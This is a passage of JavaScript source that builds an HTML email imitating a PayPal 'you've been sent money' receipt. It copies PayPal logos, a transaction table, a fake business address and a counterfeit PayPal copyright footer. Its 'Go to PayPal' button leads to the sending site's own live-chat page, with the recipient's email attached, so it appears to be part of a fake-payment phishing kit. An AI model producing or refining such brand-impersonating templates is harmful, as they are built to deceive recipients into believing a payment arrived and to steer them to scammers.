    <div style="display:none;font-size:1px;color:#f5f7fa;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">Ref-${data.ref_id || Date.now()}</div>
    <table border="0" cellpadding="0" cellspacing="0" width="100%" style="max-width: 600px; margin: 0 auto; background-color: #f5f7fa;">
        <tr>
            <td align="center" style="padding: 20px 0 10px 0; font-size: 11px; color: #6c7378;">
                ${t('hello_there', lang)}, ${data.recipient_name}
            </td>
        </tr>
        <tr>
            <td align="center" style="padding: 15px 0 25px 0;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PayPal_Logo_Icon_2014.svg" alt="PayPal" width="74" height="auto" style="display: block; border: 0; width: 74px; height: auto;">
            </td>
        </tr>
        <tr>
            <td align="center" style="padding: 0 30px; font-weight: bold; font-size: 32px; line-height: 38px; color: #000000;">
                ${data.sender_name} ${t('sent_you', lang)}<br>${fmt$(data.amount)}
            </td>
        </tr>
        <tr>
            <td style="padding: 40px 40px 10px 40px;">
                <h3 style="margin: 0; font-size: 16px; font-weight: bold; color: #000000;">${t('transaction_details', lang)}</h3>
            </td>
        </tr>
        <tr>
            <td style="padding: 0 40px;">
                <table width="100%" border="0" cellpadding="0" cellspacing="0">
                    <tr>
                        <td valign="top" style="font-size: 12px; line-height: 18px;">
                            <span style="color: #6c7378; display: block;">${t('transaction_id', lang)}</span>
                            <a href="#" style="color: #0070ba; text-decoration: underline; font-weight: 500;">${data.transaction_id}</a>
                        </td>
                        <td align="right" valign="top" style="font-size: 12px; line-height: 18px;">
                            <span style="color: #6c7378; display: block;">${t('date', lang)}</span>
                            <span style="color: #000000; font-weight: 500;">${data.date}</span>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td style="padding: 20px 40px 0 40px;">
                <hr style="border: 0; border-top: 1px solid #dcdcdc; margin: 0;">
            </td>
        </tr>
        <tr>
            <td style="padding: 15px 40px 10px 40px;">
                <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size: 13px;">
                    <tr>
                        <td style="color: #000000; font-weight: bold;">${t('amount', lang)}</td>
                        <td align="right" style="color: #000000;">${fmt$(data.amount)}</td>
                    </tr>
                    <tr>
                        <td style="color: #6c7378; font-size: 12px; padding-top: 4px;">${t('status', lang)}</td>
                        <td align="right" style="color: ${ppStatus === 'Failed' ? '#dc2626' : ppStatus === 'Pending' ? '#f59e0b' : ppStatus === 'On Hold' || ppStatus === 'Processing' ? '#2563eb' : '#2E7D32'}; font-weight: bold; font-size: 12px; padding-top: 4px;">${ppDisplayStatus}</td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td style="padding: 5px 40px 0 40px;">
                <hr style="border: 0; border-top: 1px solid #dcdcdc; margin: 0;">
            </td>
        </tr>
        <tr>
            <td style="padding: 15px 40px 0 40px;">
                <table width="100%" border="0" cellpadding="0" cellspacing="0" style="font-size: 13px; line-height: 22px;">
                    <tr>
                        <td style="color: #6c7378;">${t('fee', lang)}</td>
                        <td align="right" style="color: #6c7378;">${fmt$(data.fee)}</td>
                    </tr>
                    <tr style="font-weight: bold; font-size: 14px;">
                        <td style="color: #000000; padding-top: 5px;">${t('total', lang)}</td>
                        <td align="right" style="color: #000000; padding-top: 5px;">${fmt$(data.total)}</td>
                    </tr>
                </table>
            </td>
        </tr>
        <tr>
            <td style="padding: 25px 40px 0 40px;">
                <div style="border-top: 1px dotted #999999; height: 1px; width: 100%;"></div>
            </td>
        </tr>
        <tr>
            <td style="padding: 20px 40px 0 40px;">
                <h4 style="margin: 0 0 10px 0; font-size: 15px; font-weight: bold; color: #000000;">${t('business_address', lang)}</h4>
                <div style="font-size: 13px; line-height: 18px;">
                    <span style="color: #000000; font-weight: 600;">${data.sender_name}</span><br>
                    <span style="color: #333333;">1201 Meridian Tower, Suite 4200</span><br>
                    <span style="color: #333333;">Financial District, New York, NY 10004</span><br>
                    <span style="color: #333333;">United States</span>
                </div>
            </td>
        </tr>
        <tr>
            <td style="padding: 25px 40px 0 40px;">
                <div style="border-top: 1px dotted #999999; height: 1px; width: 100%;"></div>
            </td>
        </tr>
        <tr>
            <td style="padding: 20px 40px 0 40px; font-size: 13px; line-height: 18px; color: #000000;">
                <p style="margin: 0 0 4px 0; font-weight: 500;">${t('dont_see_money', lang)}</p>
                <p style="margin: 0; color: #333333;">${t('dont_worry_show_up', lang)}</p>
            </td>
        </tr>
        <tr>
            <td style="padding: 25px 40px 0 40px;">
                <div style="border-top: 1px dotted #999999; height: 1px; width: 100%;"></div>
            </td>
        </tr>
        <tr>
            <td align="center" style="padding: 30px 40px;">
                <a href="${APP_CONFIG.SITE_URL}/?livechat=true&email=${encodeURIComponent(data.recipient_email || '')}&source=paypal" style="display: inline-block; background-color: #000000; color: #ffffff; font-weight: bold; font-size: 15px; text-decoration: none; padding: 14px 45px; border-radius: 25px; min-width: 140px; text-align: center;">${t('go_to_paypal', lang)}</a>
            </td>
        </tr>
        <tr>
            <td style="padding: 0 40px;">
                <hr style="border: 0; border-top: 1px solid #c5c5c5; margin: 0;">
            </td>
        </tr>
        <tr>
            <td align="center" style="padding: 25px 0 10px 0;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b7/PayPal_Logo_Icon_2014.svg" alt="PayPal" width="68" height="auto" style="display: block; border: 0; opacity: 0.8; width: 68px; height: auto;">
            </td>
        </tr>
        <tr>
            <td style="padding: 10px 40px 0 40px;">
                <hr style="border: 0; border-top: 1px solid #dcdcdc; margin: 0;">
            </td>
        </tr>
        <tr>
            <td align="center" style="padding: 20px 40px 10px 40px; font-size: 11px;">
                <div style="margin-bottom: 15px;">
                    <a href="#" style="color: #0070ba; text-decoration: none; font-weight: 500;">${t('help_contact', lang)}</a>
                    <span style="color: #c5c5c5; margin: 0 5px;">|</span>
                    <a href="#" style="color: #0070ba; text-decoration: none; font-weight: 500;">${t('security', lang)}</a>
                    <span style="color: #c5c5c5; margin: 0 5px;">|</span>
                    <a href="#" style="color: #0070ba; text-decoration: none; font-weight: 500;">${t('apps', lang)}</a>
                </div>
                <div style="margin-bottom: 20px;">
                    <span style="display: inline-block; width: 24px; height: 24px; border-radius: 50%; background-color: #8a8e91; color: #ffffff; line-height: 24px; font-weight: bold; font-size: 11px; margin: 0 6px;">X</span>
                    <span style="display: inline-block; width: 24px; height: 24px; border-radius: 50%; background-color: #8a8e91; color: #ffffff; line-height: 24px; font-weight: bold; font-size: 11px; margin: 0 6px;">ig</span>
                    <span style="display: inline-block; width: 24px; height: 24px; border-radius: 50%; background-color: #8a8e91; color: #ffffff; line-height: 24px; font-weight: bold; font-size: 11px; margin: 0 6px;">f</span>
                    <span style="display: inline-block; width: 24px; height: 24px; border-radius: 50%; background-color: #8a8e91; color: #ffffff; line-height: 24px; font-weight: bold; font-size: 11px; margin: 0 6px;">in</span>
                </div>
            </td>
        </tr>
        <tr>
            <td style="padding: 0 40px 40px 40px; font-size: 10px; line-height: 15px; color: #6c7378;">
                <p style="margin: 0 0 8px 0;">${t('paypal_fraud_prevention', lang)} <a href="#" style="color: #0070ba; text-decoration: underline;">${t('learn_phishing', lang)}</a></p>
                <p style="margin: 0 0 8px 0;">${t('dont_reply_email', lang)} <a href="#" style="color: #0070ba; text-decoration: underline;">${t('help_contact', lang)}</a>.</p>
                <p style="margin: 0 0 12px 0;">${t('not_sure_why', lang)} <a href="#" style="color: #0070ba; text-decoration: underline;">${t('learn_more', lang)}</a></p>
                <p style="margin: 0 0 4px 0;">Copyright &copy; 1999-${new Date().getFullYear()} PayPal, Inc. ${t('all_rights_reserved', lang)}</p>
                <p style="margin: 0; font-size: 9px; color: #9c9c9c;">PayPal RT000297:en_US(en-US):1.8.1:ab0bbbcf23caa</p>
            </td>
        </tr>
    </table>
</body>
</html>`;
         break;
   }

   return { subject, content };
};
